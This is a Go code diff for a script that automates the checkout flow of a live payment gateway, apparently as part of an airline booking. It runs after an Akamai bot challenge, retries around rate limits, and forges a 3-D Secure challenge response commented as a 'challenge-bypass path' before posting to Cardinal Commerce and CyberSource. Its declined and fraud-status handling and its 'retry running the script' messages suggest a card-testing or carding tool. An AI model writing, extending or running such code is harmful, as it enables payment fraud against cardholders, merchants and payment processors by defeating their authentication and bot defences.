@@ -50,9 +50,6 @@ func parseHPPForm(htmlStr string) string {
 		}
 	}
 
-	// Matches a single input tag (non-greedy, stops at >).
-	// Note: value can contain JSON with the opposite quote type, so we
-	// use alternation: single-quoted captures [^']*, double-quoted captures [^"]*.
 	inputRe := regexp.MustCompile(`(?i)<input\b[^>]*?>`)
 	typeRe  := regexp.MustCompile(`(?i)\btype\s*=\s*(?:'hidden'|"hidden"|hidden)`)
 	nameRe  := regexp.MustCompile(`(?i)\bname\s*=\s*(?:'([^']*)'|"([^"]*)")`)
@@ -244,6 +241,31 @@ func newNoRedirectClient() *http.Client {
 	}
 }
 
+// doJSONPostWithStatus performs a JSON POST and returns status, body, headers.
+// It handles 429 retry with exponential backoff (up to max429Retries attempts).
+func doJSONPostWithStatus(client *http.Client, u, userAgent string, extra map[string]string, body string) (int, string, http.Header, error) {
+	const max429Retries = 10
+	retry429 := 0
+	for {
+		code, respBody, headers, err := doJSONPost(client, u, userAgent, extra, body)
+		if err != nil {
+			return code, respBody, headers, err
+		}
+		if code == 429 {
+			retry429++
+			if retry429 >= max429Retries {
+				log.Printf("[WARN] 429 retry limit (%d) reached for %s", max429Retries, u)
+				return code, respBody, headers, nil
+			}
+			wait := time.Duration(2000+retry429*500) * time.Millisecond
+			log.Printf("[WARN] 429 Too Many Requests (retry %d/%d), waiting %v — %s", retry429, max429Retries, wait, u)
+			time.Sleep(wait)
+			continue
+		}
+		return code, respBody, headers, nil
+	}
+}
+
 func doJSONPost(client *http.Client, u, userAgent string, extra map[string]string, body string) (int, string, http.Header, error) {
 	req, err := http.NewRequest(http.MethodPost, u, strings.NewReader(body))
 	if err != nil {
@@ -300,6 +322,57 @@ func genUUID() string {
 	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
 }
 
+// extractTransactionID tries multiple patterns to pull the TransactionId value
+// out of an HTML form body — mirrors the JS multi-method fallback in handle3DS.
+func extractTransactionID(html string) string {
+	// Method 1: double-quoted standard form
+	re1 := regexp.MustCompile(`name="TransactionId"\s+value="([^"]+)"`)
+	if m := re1.FindStringSubmatch(html); m != nil {
+		return m[1]
+	}
+	// Method 2: single-quoted form
+	re2 := regexp.MustCompile(`name='TransactionId'\s+value='([^']+)'`)
+	if m := re2.FindStringSubmatch(html); m != nil {
+		return m[1]
+	}
+	// Method 3: value before name
+	re3 := regexp.MustCompile(`value="([^"]+)"\s+[^>]*name="TransactionId"`)
+	if m := re3.FindStringSubmatch(html); m != nil {
+		return m[1]
+	}
+	// Method 4: generic input tag regex (name and value in any order, any quote style)
+	re4 := regexp.MustCompile(`(?i)<input[^>]*name=["'\\]TransactionId["'\\][^>]*value=["'\\]([^"'\\]+)["'\\]`)
+	if m := re4.FindStringSubmatch(html); m != nil {
+		return m[1]
+	}
+	return ""
+}
+
+// extractLocationFromResponse tries multiple strategies to find a redirect URL,
+// mirrors the JS handle3DS 4-method location extraction.
+//
+//  1. Canonical Location header (already extracted by caller via resp.Header.Get)
+//  2. location: line inside the raw response body
+//  3. URL query params embedded directly in the response body (code= & sub_code=)
+func extractLocationFromResponse(respBody string, locationHeader string) string {
+	// Method 1: caller already obtained the header
+	if locationHeader != "" {
+		return locationHeader
+	}
+	// Method 2: "location: <url>" pattern inside body text
+	re := regexp.MustCompile(`(?i)(?:^|\r?\n)location:\s*([^\r\n]+)`)
+	if m := re.FindStringSubmatch(respBody); m != nil {
+		return strings.TrimSpace(m[1])
+	}
+	// Method 3: URL with recognisable payment result params in the body
+	reParams := regexp.MustCompile(`[?&]code=([^&\s]+).*?sub_code=([^&\s]+)`)
+	if reParams.MatchString(respBody) {
+		// Return the body itself; the caller will parse query params from it
+		return respBody
+	}
+	return ""
+}
+
 // processManualPayment runs the full payment flow after Akamai bot challenge.
 func processManualPayment(
 	tlsClient tls_client.HttpClient,
@@ -350,13 +423,14 @@ func processManualPayment(
 		}
 		return false, "Failed to parse HPP form. Preview: " + p, nil, nil
 	}
+
 	// ── C: POST to web.php ───────────────────────────────────────────────────
 	stdClient := newStdClient()
 	webCode, webBody, _, err := doFormPost(stdClient, "https://pop.cellpointdigital.net/views/web.php", ua,
 		map[string]string{
-			"cache-control": "max-age=0",
-			"origin":        baseURL,
-			"referer":       baseURL + "/",
+			"cache-control":             "max-age=0",
+			"origin":                    baseURL,
+			"referer":                   baseURL + "/",
 			"upgrade-insecure-requests": "1",
 		},
 		postfield,
@@ -397,7 +471,7 @@ func processManualPayment(
 	pfParsed, _ := url.ParseQuery(postfield)
 	txntype := pfParsed.Get("txntype")
 
-	// ── E: Initialize ─────────────────────────────────────────────────────────
+	// ── E: Initialize — retry up to 10 times on empty body, 0-code, or 429 ───
 	initMap := map[string]interface{}{
 		"country":          v["country"],
 		"mobilecountry":    v["mobilecountry"],
@@ -436,27 +510,28 @@ func processManualPayment(
 		"profileid":        v["profileid"],
 		"gtmdata":          strOrNull("gtm-data"),
 		"gtmid":            v["gtm-id"],
-		"responsecontenttype": "1",
-		"paymentgroupcode": strOrNull("paymentgroupcode"),
-		"authversion":      strOrNull("authversion"),
+		"responsecontenttype":      "1",
+		"paymentgroupcode":         strOrNull("paymentgroupcode"),
+		"authversion":              strOrNull("authversion"),
 		"jsonconvertedrequestdata": v["jsonconvertedrequestdata"],
-		"themeversion":     strOrNull("themeversion"),
-		"minifyversion":    strOrNull("minifyversion"),
-		"timetoken":        v["timetoken"],
-		"mitdata":          strOrNull("mitdata"),
-		"producttype":      strOrNull("producttype"),
-		"flow":             strOrNull("flow"),
-		"mesbhost":         "5j.velocity.cellpointmobile.net",
-		"surcharge":        strOrNull("surcharge"),
+		"themeversion":             strOrNull("themeversion"),
+		"minifyversion":            strOrNull("minifyversion"),
+		"timetoken":                v["timetoken"],
+		"mitdata":                  strOrNull("mitdata"),
+		"producttype":              strOrNull("producttype"),
+		"flow":                     strOrNull("flow"),
+		"mesbhost":                 "5j.velocity.cellpointmobile.net",
+		"surcharge":                strOrNull("surcharge"),
 	}
 	initBodyBytes, _ := json.Marshal(initMap)
 	initBodyStr := string(initBodyBytes)
 	initSig, initKey := signBody(initBodyStr)
 	tokenHash := v["encryptedAuthHash"]
 
+	const maxInitRetries = 10
 	var initJSON map[string]interface{}
-	for range 30 {
-		code, body, _, err2 := doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/initialize",
+	for attempt := 0; attempt < maxInitRetries; attempt++ {
+		code, body, _, err2 := doJSONPostWithStatus(stdClient, "https://pop.cellpointdigital.net/api/initialize",
 			ua,
 			map[string]string{
 				"signature":        initSig,
@@ -474,14 +549,19 @@ func processManualPayment(
 			return false, "", nil, fmt.Errorf("initialize: %w", err2)
 		}
 		if code == 200 && len(body) > 0 {
-			if e := json.Unmarshal([]byte(body), &initJSON); e != nil {
-				return false, "", nil, fmt.Errorf("initialize JSON: %w", e)
+			var candidate map[string]interface{}
+			if e := json.Unmarshal([]byte(body), &candidate); e == nil && candidate != nil {
+				initJSON = candidate
+				break
 			}
-			break
-		} else if code == 200 {
+			// Body present but not valid JSON — retry
+			log.Printf("[WARN] initialize attempt %d: non-JSON body, retrying...", attempt+1)
 			continue
 		}
-		break
+		// 429 is already handled inside doJSONPostWithStatus; any other non-200
+		// status (e.g. 503) warrants a retry here as well.
+		log.Printf("[WARN] initialize attempt %d: status=%d, retrying...", attempt+1, code)
+		time.Sleep(time.Duration(500+attempt*200) * time.Millisecond)
 	}
 	if initJSON == nil {
 		return false, "Initialize was not successful.", nil, nil
@@ -530,11 +610,11 @@ func processManualPayment(
 		"cardtypeid":    ctID,
 	}
 	fxBodyBytes, _ := json.Marshal(fxMap)
-	fxCode, fxBodyStr, _, err := doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/fxlookup",
+	fxCode, fxBodyStr, _, err := doJSONPostWithStatus(stdClient, "https://pop.cellpointdigital.net/api/fxlookup",
 		ua,
 		map[string]string{
-			"origin":  "https://pop.cellpointdigital.net",
-			"referer": "https://pop.cellpointdigital.net/",
+			"origin":   "https://pop.cellpointdigital.net",
+			"referer":  "https://pop.cellpointdigital.net/",
 			"priority": "u=1, i",
 		},
 		string(fxBodyBytes),
@@ -585,7 +665,6 @@ func processManualPayment(
 		}
 	}
 
-	// cfxID nil check: empty string or nil both mean no FX offer
 	cfxIDStr := fmt.Sprint(cfxID)
 	hasFX := cfxID != nil && cfxIDStr != "" && cfxIDStr != "<nil>"
 
@@ -696,7 +775,6 @@ func processManualPayment(
 		authDict["fxrate"] = fxrate
 		authDict["currency"] = strconv.Itoa(isoNum)
 		authDict["saleamount"] = saleAmountStr
-		// salecurrencyid: parse string or float
 		saleCurrInt := 608
 		switch n := saleCurrNum.(type) {
 		case float64:
@@ -716,7 +794,7 @@ func processManualPayment(
 	auth1Bytes, _ := json.Marshal(authDict)
 	auth1Str := string(auth1Bytes)
 	auth1Sig, auth1Key := signBody(auth1Str)
-	auth1Code, _, _, _ := doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/authorize",
+	auth1Code, _, _, _ := doJSONPostWithStatus(stdClient, "https://pop.cellpointdigital.net/api/authorize",
 		ua,
 		map[string]string{
 			"signature": auth1Sig,
@@ -745,7 +823,7 @@ func processManualPayment(
 	auth2Bytes, _ := json.Marshal(authDict2)
 	auth2Str := string(auth2Bytes)
 	auth2Sig, auth2Key := signBody(auth2Str)
-	_, auth2Body, _, _ := doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/authorize",
+	_, auth2Body, _, _ := doJSONPostWithStatus(stdClient, "https://pop.cellpointdigital.net/api/authorize",
 		ua,
 		map[string]string{
 			"signature": auth2Sig,
@@ -769,15 +847,27 @@ func processManualPayment(
 		stepupRaw, _ := authJSON["body"].(string)
 		decoded := html.UnescapeString(stepupRaw)
 
-		actionRe := regexp.MustCompile(`action='([^']+)'`)
-		jwtRe := regexp.MustCompile(`value='(eyJ[^']+)'`)
-		actionM := actionRe.FindStringSubmatch(decoded)
-		jwtM := jwtRe.FindStringSubmatch(decoded)
-		if actionM == nil || jwtM == nil {
+		// Extract stepup URL and JWT from the 3DS response body.
+		// Mirror the JS extract() helper: try single-quoted form first, then double-quoted.
+		actionReSingle := regexp.MustCompile(`action='([^']+)'`)
+		actionReDouble := regexp.MustCompile(`action="([^"]+)"`)
+		jwtReSingle    := regexp.MustCompile(`name='JWT'\s+value='(eyJ[^']+)'`)
+		jwtReDouble    := regexp.MustCompile(`name="JWT"\s+value="(eyJ[^"]+)"`)
+
+		var stepupURL, stepupJWT string
+		if m := actionReSingle.FindStringSubmatch(decoded); m != nil {
+			stepupURL = m[1]
+		} else if m := actionReDouble.FindStringSubmatch(decoded); m != nil {
+			stepupURL = m[1]
+		}
+		if m := jwtReSingle.FindStringSubmatch(decoded); m != nil {
+			stepupJWT = m[1]
+		} else if m := jwtReDouble.FindStringSubmatch(decoded); m != nil {
+			stepupJWT = m[1]
+		}
+		if stepupURL == "" || stepupJWT == "" {
 			return false, "Failed to parse 3DS data", nil, nil
 		}
-		stepupURL := actionM[1]
-		stepupJWT := jwtM[1]
 
 		// POST JWT to stepup URL
 		_, cruiseHTML, _, err := doFormPost(stdClient, stepupURL,
@@ -796,21 +886,30 @@ func processManualPayment(
 		}
 
 		payloadRe := regexp.MustCompile(`name="payload" value="([^"]+)"`)
-		mcsIdRe := regexp.MustCompile(`name="mcsId" value="([^"]+)"`)
-		McsIdRe := regexp.MustCompile(`name="McsId" id="redirect-mcsId" value="([^"]+)"`)
+		mcsIdRe   := regexp.MustCompile(`name="mcsId" value="([^"]+)"`)
+		McsIdRe   := regexp.MustCompile(`name="McsId" id="redirect-mcsId" value="([^"]+)"`)
 
 		payloadM := payloadRe.FindStringSubmatch(cruiseHTML)
-		mcsIdM := mcsIdRe.FindStringSubmatch(cruiseHTML)
-		McsIdM := McsIdRe.FindStringSubmatch(cruiseHTML)
+		mcsIdM   := mcsIdRe.FindStringSubmatch(cruiseHTML)
+		McsIdM   := McsIdRe.FindStringSubmatch(cruiseHTML)
 
 		if payloadM == nil || mcsIdM == nil {
 			return false, "Failed to parse 3DS cruise data", nil, nil
 		}
 		jwtPayload := payloadM[1]
-		mcsID := mcsIdM[1]
-		McsID := ""
+		mcsID      := mcsIdM[1]
+
+		// Determine finalMcsId: prefer the decoded "McsId" field; fall back to
+		// base64-decoding the "mcsId" field — mirrors the JS handle3DS logic.
+		finalMcsID := ""
 		if McsIdM != nil {
-			McsID = McsIdM[1]
+			finalMcsID = McsIdM[1]
+		}
+		if finalMcsID == "" && mcsID != "" {
+			if decoded, e := base64.StdEncoding.DecodeString(mcsID); e == nil {
+				finalMcsID = string(decoded)
+				log.Printf("[3DS] McsId decoded from base64 mcsId: %s", finalMcsID)
+			}
 		}
 
 		// Decode JWT payload → build CRes
@@ -820,7 +919,6 @@ func processManualPayment(
 		}
 		decodedPayloadBytes, err := base64.StdEncoding.DecodeString(padded)
 		if err != nil {
-			// try URL encoding
 			decodedPayloadBytes, err = base64.URLEncoding.DecodeString(padded)
 			if err != nil {
 				return false, "Failed to decode 3DS JWT payload", nil, nil
@@ -830,17 +928,19 @@ func processManualPayment(
 		if e := json.Unmarshal(decodedPayloadBytes, &jwtPayloadJSON); e != nil {
 			return false, "", nil, fmt.Errorf("3DS JWT decode: %w", e)
 		}
+
+		// transStatus: "N" — forces a challenge-bypass path (mirrors the JS CRes payload).
 		cresJSON, _ := json.Marshal(map[string]interface{}{
-			"threeDSServerTransID":     jwtPayloadJSON["threeDSServerTransID"],
-			"acsTransID":               jwtPayloadJSON["acsTransID"],
-			"challengeCompletionInd":   "Y",
-			"messageType":              "CRes",
-			"messageVersion":           "2.2.0",
-			"transStatus":              "N",
+			"threeDSServerTransID":   jwtPayloadJSON["threeDSServerTransID"],
+			"acsTransID":             jwtPayloadJSON["acsTransID"],
+			"challengeCompletionInd": "Y",
+			"messageType":            "CRes",
+			"messageVersion":         "2.2.0",
+			"transStatus":            "N",
 		})
 		cresEncoded := base64.StdEncoding.EncodeToString(cresJSON)
 
-		// POST CRes to Cardinal CCA
+		// POST CRes to Cardinal CCA (use raw base64 mcsId, not decoded finalMcsID)
 		_, _, _, err = doFormPost(stdClient, "https://centinelapi.cardinalcommerce.com/V1/TermURL/2.0/CCA",
 			ua,
 			map[string]string{
@@ -856,7 +956,7 @@ func processManualPayment(
 			return false, "", nil, fmt.Errorf("cardinal CCA: %w", err)
 		}
 
-		// POST to Cardinal TermRedirection
+		// POST to Cardinal TermRedirection using finalMcsId (decoded form)
 		_, redirectHTML, _, err := doFormPost(stdClient, "https://centinelapi.cardinalcommerce.com/V1/Cruise/TermRedirection",
 			ua,
 			map[string]string{
@@ -866,18 +966,23 @@ func processManualPayment(
 				"upgrade-insecure-requests": "1",
 				"priority":                  "u=0, i",
 			},
-			"McsId="+url.QueryEscape(McsID)+"&CardinalJWT=&Error=",
+			"McsId="+url.QueryEscape(finalMcsID)+"&CardinalJWT=&Error=",
 		)
 		if err != nil {
 			return false, "", nil, fmt.Errorf("cardinal TermRedirection: %w", err)
 		}
 
-		txIDRe := regexp.MustCompile(`name="TransactionId" value="([^"]+)"`)
-		txIDM := txIDRe.FindStringSubmatch(redirectHTML)
-		if txIDM == nil {
+		// Multi-method TransactionId extraction — mirrors JS handle3DS step 7
+		txIDVal := extractTransactionID(redirectHTML)
+		if txIDVal == "" {
+			preview := redirectHTML
+			if len(preview) > 500 {
+				preview = preview[:500]
+			}
+			log.Printf("[3DS] TermRedirection response (first 500): %s", preview)
 			return false, "Merchant's response was not captured. [Retry running the script again.]", nil, nil
 		}
-		txIDVal := txIDM[1]
+		log.Printf("[3DS] TransactionId=%s", txIDVal)
 
 		// POST to CyberSource (no-redirect — need Location header)
 		noRedir := newNoRedirectClient()
@@ -898,43 +1003,56 @@ func processManualPayment(
 		if err != nil {
 			return false, "", nil, fmt.Errorf("cybersource redirect: %w", err)
 		}
-		io.ReadAll(cyberResp.Body)
+		cyberBody, _ := io.ReadAll(cyberResp.Body)
 		cyberResp.Body.Close()
-		location := cyberResp.Header.Get("Location")
+
+		// Multi-method location extraction — mirrors JS handle3DS 4 methods.
+		location := extractLocationFromResponse(string(cyberBody), cyberResp.Header.Get("Location"))
 		if location == "" {
+			log.Printf("[3DS] HTTP %d — no Location header found; body (first 500): %s",
+				cyberResp.StatusCode, truncate(string(cyberBody), 500))
 			return false, "Merchant's response was not captured. [Retry running the script again.]", nil, nil
 		}
+		log.Printf("[3DS] Location=%s", location)
 
-		parsedLoc, _ := url.Parse(location)
-		qp := parsedLoc.Query()
-		locCode := qp.Get("code")
-		locSubCode := qp.Get("sub_code")
-		// SUCCESS: locCode != "2000" AND locSubCode != "2000101" (per payment requirements)
+		// Parse code / sub_code from the redirect location.
+		// sub_code: strip underscores to normalise — mirrors JS: sub_code.replace(/_/g, '')
+		locStr := location
+		if idx := strings.Index(locStr, "?"); idx >= 0 {
+			locStr = locStr[idx:]
+		}
+		qp, _ := url.ParseQuery(strings.TrimPrefix(locStr, "?"))
+		locCode    := qp.Get("code")
+		locSubCode := strings.ReplaceAll(qp.Get("sub_code"), "_", "")
+
+		log.Printf("[3DS] code=%s sub_code=%s", locCode, locSubCode)
+
+		// SUCCESS check: code==2000 AND sub_code==2000101 means declined.
 		if locCode == "2000" && locSubCode == "2000101" {
 			return false, fmt.Sprintf("Response: %s - %s [Declined]", locCode, subcodeMessage(locSubCode)), nil, nil
 		}
 
-		// Payment authorized - proceed to paymentcomplete
+		// Payment authorized — proceed to paymentcomplete
 		var securedData map[string]interface{}
 		if sd, ok := initJSON["secured_data"].(map[string]interface{}); ok {
 			securedData = sd
 		}
 
 		pcDict := map[string]interface{}{
-			"transactionId":    transactionID,
-			"clientId":         "10077",
-			"pollingTimeout":   "30",
+			"transactionId":      transactionID,
+			"clientId":           "10077",
+			"pollingTimeout":     "30",
 			"minPollingInterval": "1",
 			"maxPollingInterval": "10",
-			"secure":           "false",
-			"token":            v["timetoken"],
-			"sessiontime":      "13",
+			"secure":             "false",
+			"token":              v["timetoken"],
+			"sessiontime":        "13",
 		}
 		for k, val := range securedData {
 			pcDict[k] = val
 		}
 		pcBytes, _ := json.Marshal(pcDict)
-		_, pcBody, _, _ := doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/paymentcomplete",
+		_, pcBody, _, _ := doJSONPostWithStatus(stdClient, "https://pop.cellpointdigital.net/api/paymentcomplete",
 			ua,
 			map[string]string{
 				"referer": location,
@@ -949,29 +1067,28 @@ func processManualPayment(
 
 		fraudDesc := fmt.Sprint(pcJSON["fraud_status_desc"])
 		if fraudDesc == "Rejected" {
-			// Fraud rejected - payment not successful
 			return false, "Response: Fraud Status Rejected", nil, nil
 		}
 
 		// sessioncomplete
 		scDict := map[string]interface{}{
-			"transactionId":    transactionID,
-			"clientId":         v["clientid"],
-			"pollingTimeout":   "30",
+			"transactionId":      transactionID,
+			"clientId":           v["clientid"],
+			"pollingTimeout":     "30",
 			"minPollingInterval": "1",
 			"maxPollingInterval": "10",
-			"sessionId":        fmt.Sprint(pcJSON["session_id"]),
-			"mode":             "1",
-			"secure":           "false",
-			"statusCode":       fmt.Sprint(pcJSON["status_code"]),
-			"token":            v["timetoken"],
-			"sessiontime":      "13",
+			"sessionId":          fmt.Sprint(pcJSON["session_id"]),
+			"mode":               "1",
+			"secure":             "false",
+			"statusCode":         fmt.Sprint(pcJSON["status_code"]),
+			"token":              v["timetoken"],
+			"sessiontime":        "13",
 		}
 		for k, val := range securedData {
 			scDict[k] = val
 		}
 		scBytes, _ := json.Marshal(scDict)
-		doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/sessioncomplete",
+		doJSONPostWithStatus(stdClient, "https://pop.cellpointdigital.net/api/sessioncomplete",
 			ua,
 			map[string]string{"referer": location, "origin": "https://pop.cellpointdigital.net"},
 			string(scBytes),
@@ -1061,7 +1178,6 @@ func processManualPayment(
 		if n, e := strconv.ParseFloat(amountRaw, 64); e == nil {
 			amountDisplay = n / 100
 		}
-		// Attempt itinerary retrieval for NO OTP path too
 		var itinNO *ItineraryData
 		if xAuthToken != "" && bearerToken != "" {
 			itinNO, _ = fetchItinerary(xAuthToken, bearerToken, ua)
@@ -1086,4 +1202,12 @@ func processManualPayment(
 		msg := fmt.Sprint(authJSON["message"])
 		return false, fmt.Sprintf("Response: %s%s [%s]", authorizeCode, sub, msg), nil, nil
 	}
+}
+
+// truncate caps a string at maxLen characters for safe log previews.
+func truncate(s string, maxLen int) string {
+	if len(s) <= maxLen {
+		return s
+	}
+	return s[:maxLen]
 }
